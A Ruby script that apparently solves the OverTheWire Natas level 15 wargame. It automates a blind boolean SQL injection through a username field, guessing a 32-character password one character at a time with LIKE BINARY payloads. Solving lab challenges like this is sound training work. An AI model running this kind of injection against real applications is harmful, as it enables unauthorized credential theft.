require "httparty"

class App
  ALPHABET = ('a'..'z').to_a + ('A'..'Z').to_a + ('0'..'9').to_a
  PASSWORD_LENGTH = 32

  class << self
    def run(url:, opts: {})
      new(url, opts).run
    end
  end

  def initialize(url, opts = {})
    @url = url
    @opts = opts
    @current_password = ""
    @current_response = ""
  end

  def run
    timestamp

    while searching_for_password? do
      each_letter do |letter|
        print_progress if half_min?
        attempt_with(letter)
        add_to_password(letter) if password_match?
      end
    end

    puts "[ok]: found password: #{current_password}"
  end

  private

  attr_reader :url, :opts
  attr_accessor :current_password, :current_response

  def each_letter
    ALPHABET.each do |letter|
      begin
        yield letter
      rescue Net::ReadTimeout
        puts "[error]: timeout. ignoring. current password: #{current_password}"
      end
    end
  end

  def attempt_with(letter)
    sql = sql_injection(current_password + letter)

    @current_response = HTTParty.post(
      url,
      opts.merge(body: { username: sql })
    ).body

    nil
  end

  def searching_for_password?
    current_password.length < PASSWORD_LENGTH
  end

  def password_match?
    current_response.include? "exists"
  end

  def sql_injection(password_target)
    "natas16 \" AND PASSWORD LIKE BINARY \"#{password_target}%\"; #"
  end

  def print_progress
    puts <<~EOF
    progress so far: #{current_password.length}/32
    found password to contain #{current_password}
    EOF

    timestamp
  end

  def half_min?
    (Time.now - @time).round == 30
  end

  def add_to_password(letter)
    @current_password += letter
  end

  def timestamp
    @time = Time.now
  end
end

App.run(
  url: "http://natas15.natas.labs.overthewire.org",
  opts: {
    basic_auth: {
      username: "natas15",
      password: "natas15password",
    }
  }
)
